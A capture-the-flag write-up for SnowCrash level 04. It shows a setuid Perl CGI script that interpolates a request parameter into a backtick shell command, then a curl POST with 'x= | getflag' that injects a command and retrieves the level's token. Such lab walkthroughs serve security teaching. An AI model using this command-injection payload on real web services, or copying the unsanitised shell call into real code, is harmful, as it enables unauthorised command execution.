Level 04
========

*	This time we spawn with one file:
	```console
	level04@SnowCrash:~$ ls -l 
	total 4
	-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
	```
*	But like everytime -> We use find
	```console
	level04@SnowCrash:~$ find / -type f -group level04 2>/dev/null | grep -v find | grep -v proc | grep -v rofs
	/var/www/level04/level04.pl
	```
*	They have the exact same Perl script, the only difference here is the permissions they are given
	```console
	-rwsr-sr-x 1 flag04 level04 152 Mar 5 2016 level04.pl
	-r-xr-x--- 1 flag04 level04 152 Mar 12 2016 level04.pl
	```
*   Looking at the code we can see that it is vulnerable to command injection :
	```perl
	#!/usr/bin/perl
	# localhost:4747
	use CGI qw{param};
	print "Content-type: text/html\n\n";
	sub x {
		$y = $_[0];
		print `echo $y 2>&1`;
	}
	x(param("x"));
	```
	We can in fact see that the content of `y` is printed via the `echo` command !
*	So I tried something like this using the hint given in comment :
	```console
	level04@SnowCrash:~$ curl -X POST -d "x= $PWD" http://localhost:4747
	/home/user/level04
	```
*	This one, I found tricky because we can see echo is executed but what is interesting is that if we use a pipe, ANYTHING is executed :
	```console
	level04@SnowCrash:~$ curl -X POST -d "x= | getflag" http://localhost:4747
	Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
	```